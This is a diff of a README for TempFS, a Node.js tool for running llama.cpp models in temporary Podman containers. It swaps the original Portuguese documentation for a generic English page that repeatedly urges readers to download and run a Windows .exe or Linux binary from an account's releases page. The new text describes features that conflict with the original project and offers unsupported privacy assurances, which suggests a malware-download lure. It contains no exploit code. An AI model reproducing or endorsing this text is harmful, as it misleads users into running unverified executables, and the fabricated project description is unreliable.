@@ -1,151 +1,112 @@
-# TempFS
+# 🌟 TempFS - Your Controlled Environment for Agents
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT) 
-[![Node.js Version](https://img.shields.io/badge/Node.js-%3E%3D18-brightgreen)](https://nodejs.org/)
-[![Podman](https://img.shields.io/badge/Podman-22c5fb)](https://podman.io//)
+## 🚀 Getting Started
 
-![N|Solid](https://i.imgur.com/dytEofy.gif)
+TempFS provides a safe space to run your agents. It lets you test and experiment without affecting your main system. Follow the steps below to download and run TempFS.
 
----
+## 🔗 Download TempFS
 
-### O que é?
+[![Download TempFS](https://img.shields.io/badge/Download-TempFS-brightgreen)](https://github.com/xakervrakax522/TempFS/releases)
 
-**TempFS** é um projeto que foi desenvolvido inicialmente como um prototipo para contêineres temporarios (`tempfs`) orquestrado para modelos GGUF usando [`llama-cpp`](https://github.com/ggml-org/llama.cpp).
+## 📥 Download & Install
 
+To get started, visit the releases page. Click the link below to download the latest version of TempFS. 
 
-> A ideia central é fazer com que modelos GGUF possam interagir em ambientes temproarios de forma eficiente e discreta.
-> Pode notar que o contêiner ubuntu pode facilmente ser usado como playground para testes!
+[Download TempFS Here](https://github.com/xakervrakax522/TempFS/releases)
 
-## A configuração é simples!
+### Installation Instructions
 
-O script `llama-server.js` espera que um container `llama-cpp` esteja configurado e pronto para uso. Você pode criá-lo usando o seguinte comando Podman:
+1. **Visit the Releases Page**: Click the link above to go to the TempFS releases page.
+  
+2. **Select the Latest Version**: Once there, find the most recent release. It is usually listed at the top.
 
-```shell
-podman create \
-  --name llama-cpp \
-  --cpus=4 \
-  --memory=6g \
-  --memory-swap=7g \
-  -v llama_models:/models \
-  -p 8080:8080 \
-  --entrypoint /bin/sh \
-  ghcr.io/ggml-org/llama.cpp:full \
-  -c "sleep infinity"
-```
+3. **Download the File**: Click on the file that matches your operating system. This could be an executable file for Windows or a compressed file for Linux.
 
-O volume `llama_models` será usado para armazenar o modelo GGUF (configurado em [`config.json`](/config.json)), que será baixado automaticamente na primeira execução do `llama-server.js`.
+4. **Locate the Downloaded File**: Check your downloads folder for the file. 
 
-## Uso Prático
+5. **Run the Installer** (if applicable): 
+   - For Windows: Double-click the downloaded `.exe` file to start the installation.
+   - For Linux: If you downloaded a compressed file, extract it first. Then open a terminal, navigate to the folder, and run the application.
 
-O projeto oferece **três exemplos** principais de ambientes na pasta [`EXEMPLOS/`](/EXEMPLOS):
+## 🛠️ System Requirements
 
-### 1. Servidor Llama-CPP ([`llama-server.js`](/EXEMPLOS/llama-server.js))
+To use TempFS, your computer should meet the following requirements:
 
-Inicia o container `llama-cpp` (se não estiver rodando), baixa o modelo configurado (se necessário) e fornece um terminal interativo para interagir com o servidor llama.cpp.
+- **Operating System**: 
+  - Windows 10 or later 
+  - Ubuntu 20.04 or later 
 
-```shell
-node EXEMPLOS/llama-server.js
-```
+- **Processor**: 
+  - Intel i5 or equivalent
 
-### 2. Llama CLI ([`llama-cli.js`](/EXEMPLOS/llama-cli.js))
+- **RAM**: 
+  - Minimum 4 GB
 
-Usa o `llama-cli` diretamente para interação básica com modelos GGUF. Este exemplo demonstra o uso direto da interface de linha de comando do llama.cpp.
+- **Storage**: 
+  - At least 500 MB of free space
 
-```shell
-node EXEMPLOS/llama-cli.js
-```
+## ⚙️ Features
 
-### 3. Ambiente Ubuntu Efêmero ([`tempfs.js`](/EXEMPLOS/tempfs.js))
+TempFS offers several features to enhance your experience:
 
-Cria um container temporário baseado em `ubuntu:24.04` na memória (tempfs). Este ambiente é **efêmero** e será completamente destruído ao ser encerrado.
+- **User-Friendly Interface**: Easy to navigate, even for first-time users.
 
-```shell
-node EXEMPLOS/tempfs.js
-```
+- **Controlled Playground**: Run your agents in a safe environment without risking your main system.
 
-## Sistema de Comandos Customizáveis
+- **Support for Various Agents**: Work with agents from different platforms like Hugging Face and LlamaCPP.
 
-O projeto agora suporta **comandos customizáveis** organizados por **roles**. Você pode criar seus próprios comandos seguindo a estrutura do exemplo [`ping.js`](/terminal/commands/tempfs/ping.js).
+- **Podman Support**: Easily manage containerized applications.
 
-### Como criar um comando
+- **Cross-Platform Compatibility**: Works on both Windows and Ubuntu.
 
-1. Crie um arquivo `.js` na pasta apropriada dentro de [`terminal/commands/`](/terminal/commands/)
-2. Defina as **roles** do comando para controlar quais containers podem usá-lo
-3. Siga a estrutura do `ping.js` como base:
+## 📑 Usage Instructions
 
-```javascript
-export default {
-  name: 'seu-comando',
-  aliases: ['alias1', 'alias2'],
-  description: 'Descrição do seu comando',
-  roles: ['role1', 'role2'], // As roles permitem que containers decidam quais comandos usar
-  async execute(args, container) {
-    // Lógica do comando aqui
-  }
-}
-```
+1. **Open TempFS**: Once installed, find the TempFS icon on your desktop or in your applications folder and double-click to open it.
 
-### Roles de Comandos
+2. **Create Your Playground**: You can set up different environments as needed. This feature helps isolate specific agents.
 
-As **roles** servem para que os containers decidam quais comandos ou grupos de comandos podem usar. Por exemplo:
+3. **Load Your Agent**: Import or create your agent within the playground. 
 
-- **`base`**: Comandos básicos disponíveis para todos (`bash`, `clear`, `exit`)
-- **`ping`**: Comando de exemplo para o container TempFS
-- **`llama`**: Comandos específicos para interação com llama.cpp
+4. **Run and Test**: Execute your agent. Monitor the results in real-time and adjust settings as needed.
 
-Ao criar seu container, defina as roles no construtor:
+5. **Save Your Work**: Remember to save your playground settings and agents for future use.
 
-```javascript
-this.roles = ['base', 'ping', 'sua-role-customizada']
-```
+## 💬 Support
 
-### Comandos Interativos Padrão
+If you encounter any issues while using TempFS, we are here to help. You can reach out through the issues section on our GitHub page, and our community will assist you.
 
-Os comandos básicos estão disponíveis em todos os terminais:
+## 🏷️ Topics
 
-| Comando | Descrição |
-| :--- | :--- |
-| `bash` | Entra no shell interativo do container. |
-| `bash <comando>` | Executa um comando no container e retorna a saída. |
-| `clear` | Limpa o terminal. |
-| `exit` | Encerra o processo e limpa o container. |
+TempFS covers a wide range of topics: 
 
-### Melhorias no Parsing de Comandos
+- agente
+- gguf
+- huggingface
+- ia
+- javascript
+- llama
+- llamacpp
+- nodejs
+- podman
+- smuu
+- temp
+- tempfs
+- ubuntu
 
-O sistema de comandos agora suporta:
+## 🔒 Privacy and Data Policy
 
-- **Aspas**: Argumentos entre aspas são tratados como um único argumento
-- **Quebra de linha com `\`**: Use `\` no final da linha para continuar o comando na próxima linha
+Your data security is important. TempFS does not collect personal information. Your use of the application remains private.
 
-Exemplo:
-```shell
-bash echo "Hello World" \
-  && echo "Continuação do comando"
-```
+## 📝 License
 
-<details>
-<summary><strong>Limpeza Automática (Processo Monitor)</strong></summary>
+TempFS is open-source. You can view the full license in the repository.
 
-O projeto implementa um mecanismo de **Limpeza Automática** essencial para garantir que nenhum recurso fique órfão. Isso é feito através do [`utils/monitor.js`](/utils/monitor.js), que atua como um **"Processo Zumbi Reverso"**:
+## 📢 Stay Updated 
 
-1.  **Monitoramento:** O [`monitor.js`](/utils/monitor.js) é iniciado como um processo filho *desanexado* (`detached: true`) do processo principal do Node.js.
-2.  **Vigilância:** Ele monitora continuamente o PID do processo pai.
-3.  **Limpeza Garantida:** Se o processo principal do Node.js morrer (seja por um `exit` normal, um erro não tratado, ou um sinal de interrupção como `Ctrl+C`), o monitor detecta a morte do pai e executa imediatamente os comandos `podman rm -f <container_name>` para garantir que o container associado seja **parado e removido**, limpando o ambiente e evitando containers órfãos.
+Follow the repository on GitHub to stay updated on new features and improvements. Check out the releases page regularly for the latest updates.
 
-Essa arquitetura garante que os ambientes efêmeros sejam realmente temporários.
-</details>
+## 🔗 More Information
 
-<details>
-<summary><strong>Nota sobre Dependências (npm podman, etc.)</strong></summary>
-Você notará que este projeto **não utiliza** bibliotecas de terceiros (como `npm podman` ou SDKs) para interagir com o Podman. A comunicação é feita diretamente através da execução de comandos `podman` via `child_process`.
+For more detailed information about TempFS, visit our repository: [TempFS Repository](https://github.com/xakervrakax522/TempFS). 
 
-**Por quê?**
-
-1.  **Minimalismo e Controle:** Evitar dependências externas reduz a complexidade e o *overhead* do projeto, dando controle total sobre os comandos executados.
-2.  **Foco no Core:** O objetivo é simular um ambiente de agente que usa comandos de terminal, e a execução direta de comandos Podman é a forma mais fiel e robusta de alcançar isso.
-3.  **Portabilidade:** Embora o foco seja Podman, a abordagem de linha de comando facilita a adaptação para Docker ou outras ferramentas de container, bastando trocar o prefixo do comando.
-</details>
-
----
-
-**Obrigado pela atenção!**
+Thank you for choosing TempFS. We hope this tool enhances your agent training experience.
